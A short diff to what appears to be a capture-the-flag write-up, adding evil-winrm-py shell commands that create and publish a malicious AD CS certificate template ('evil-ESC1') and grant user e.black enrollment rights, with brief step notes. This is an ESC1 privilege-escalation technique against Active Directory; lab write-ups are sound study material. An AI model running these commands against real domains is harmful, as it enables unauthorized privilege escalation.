@@ -1070,6 +1070,17 @@ Ill then import it
 
 ```python
 evil-winrm-py PS C:\Users\e.black\Desktop> type Machine.json | ConvertTo-Json | Set-Content evil-ESC1.json
+evil-winrm-py PS C:\Users\e.black\Desktop> New-ADCSTemplate -DisplayName "evil-ESC1" -Publish -JSON (cat evil-ESC1.json -raw)
+evil-winrm-py PS C:\Users\e.black\Desktop> Set-ADCSTemplateACL -DisplayName "evil-ESC1" -type allow -identity 'coder\e.black' -enroll
+```
+
+First ill ensure its reading it as JSON so ill convert the output to json then put this into a new file
+
+Then create the template using the new json file
+
+Then finally ensure the `e.black` user can enroll
+
+```python
 
 ```
 
